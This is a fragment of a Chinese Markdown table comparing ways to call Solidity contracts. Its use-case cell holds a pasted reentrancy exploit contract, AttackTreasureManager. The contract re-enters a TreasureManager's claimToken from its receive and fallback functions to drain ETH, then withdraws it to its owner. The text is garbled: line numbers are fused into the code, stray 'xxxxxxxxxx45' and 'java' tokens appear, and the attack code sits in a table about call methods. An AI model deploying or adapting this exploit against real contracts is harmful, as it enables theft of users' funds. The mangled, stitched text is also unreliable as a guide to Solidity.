...
| 调用方式     | 优点                            | 缺点                         | 适用场景                                                     |
| :----------- | :------------------------------ | :--------------------------- | :----------------------------------------------------------- |
| **直接调用** | 简单直观，类型安全              | 需要导入合约代码，编译时依赖 | xxxxxxxxxx45 1// SPDX-License-Identifier: UNLICENSED2pragma solidity ^0.8.0;3​4import "@openzeppelin/contracts/token/ERC20/IERC20.sol";5import "../src/TreasureManager.sol";6​7contract AttackTreasureManager {8    TreasureManager public treasureManager;9    address payable public owner;10    uint256 public attackAmount;11​12    constructor(address _treasureManager) {13        treasureManager = TreasureManager(payable(_treasureManager));14        owner = payable(msg.sender);15    }16​17    function attackClaimToken(address tokenAddress) external {18        attackAmount = 0;19        treasureManager.claimToken(tokenAddress);20    }21​22    receive() external payable {23        reentrance();24    }25​26    fallback() external payable {27        reentrance();28    }29​30    function reentrance() internal {31        address ethAddress = treasureManager.ethAddress();32        uint left = treasureManager.userRewardAmounts(33            address(this),34            ethAddress35        );36        attackAmount += left;37        if (treasureManager.tokenBalances(ethAddress) > attackAmount + left) {38            treasureManager.claimToken(ethAddress);39        }40    }41​42    function withdraw() public {43        payable(owner).transfer(address(this).balance);44    }45}java |
